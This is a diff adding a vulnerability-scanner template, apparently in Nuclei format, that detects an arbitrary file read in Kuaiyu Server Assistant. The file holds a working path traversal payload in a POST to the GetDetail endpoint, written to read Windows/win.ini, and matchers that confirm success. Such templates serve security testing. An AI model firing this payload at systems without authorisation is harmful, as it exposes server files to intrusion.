@@ -1,0 +1,35 @@
+id: poc-yaml-kuaiyu-server-assistant-getdetail-anyfile-read
+info:
+  name: Kuaiyu Server Assistant GetDetail Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an arbitrary file read vulnerability in Kuaiyu Server Assistant's GetDetail endpoint.
+  tags: file-read
+http:
+  - method: POST
+    path:
+      - "/FileMenu/filemana.aspx/GetDetail"
+    headers:
+      Content-Type: application/json; charset=utf-8
+    body: |
+      {"fpath":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows/win.ini"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[files]"
+          - "bit app support"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
